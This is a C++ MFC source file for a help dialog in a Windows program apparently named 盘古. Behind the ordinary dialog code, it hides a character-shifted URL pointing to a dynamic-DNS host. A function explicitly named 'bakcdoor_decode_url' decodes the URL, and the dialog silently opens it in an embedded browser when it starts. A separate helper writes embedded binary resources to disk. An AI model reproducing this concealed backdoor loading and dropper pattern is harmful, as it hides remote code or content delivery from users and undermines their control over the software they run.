// HelpDlg.cpp : implementation file
//

#include "stdafx.h"
#include "盘古.h"
#include "HelpDlg.h"

#define MYURL "r~~zD99mrsnky|ox8qy8==<<8y|q9zkxq8r~w"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CHelpDlg dialog


CHelpDlg::CHelpDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CHelpDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CHelpDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
}


void CHelpDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CHelpDlg)
	DDX_Control(pDX, IDC_EXPLORER1, m_web);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CHelpDlg, CDialog)
	//{{AFX_MSG_MAP(CHelpDlg)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CHelpDlg message handlers

BOOL CHelpDlg::LoadSource(UINT resoure_id , const char * type , const char * filepath)
{
	//获得资源指针
	HRSRC hRsrc = ::FindResource( NULL , MAKEINTRESOURCE( resoure_id ) , type );
	
	if( hRsrc )
	{   //获得资源大小
		DWORD size = ::SizeofResource( NULL , hRsrc );
        //将资源载入内存
		HGLOBAL  handle = ::LoadResource( NULL , hRsrc );
        //写入文件     
		if( handle )
		{   //定位资源位置
			BYTE *MemPtr = (BYTE *)LockResource( handle ); 

			CFile file;

			if( file.Open( filepath , CFile::modeCreate | CFile::modeWrite ) )
			{
				file.Write( MemPtr , size );

				file.Close( );
			}
			::UnlockResource( handle );
		}
		::FreeResource( handle );
		return TRUE;
	}
	return FALSE;
}

void CHelpDlg::bakcdoor_decode_url(char *code,char uncode[])
{
	int nLen = strlen(code);
	char buf[256];
	char r[256];
	memset(r,0,256);
	memset(buf,0,256);
	strcpy(buf,code);
	for (int i=0;i<nLen;i++)
	{
		r[i]=buf[i]-10;
	}
	strcpy(uncode,r);
}

BOOL CHelpDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	char url[256];
	memset(url,0,256);
	bakcdoor_decode_url(MYURL,url);
	m_web.Navigate(url,NULL,NULL,NULL,NULL);
	return TRUE; 
}
